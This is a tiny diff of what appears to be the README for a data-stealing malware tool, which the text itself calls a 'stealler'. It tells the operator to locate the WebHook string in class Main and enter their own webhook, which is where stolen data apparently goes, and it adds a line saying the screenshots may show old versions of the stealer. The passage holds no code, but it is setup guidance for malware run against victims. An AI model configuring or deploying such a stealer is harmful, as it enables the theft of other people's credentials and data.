@@ -14,3 +14,5 @@ in class Main or string WebHook (find in CTRL + SHIFT + F)
 
 Enter your webhook from string
 
+*The screenshots may contain old versions of the stealler*
+
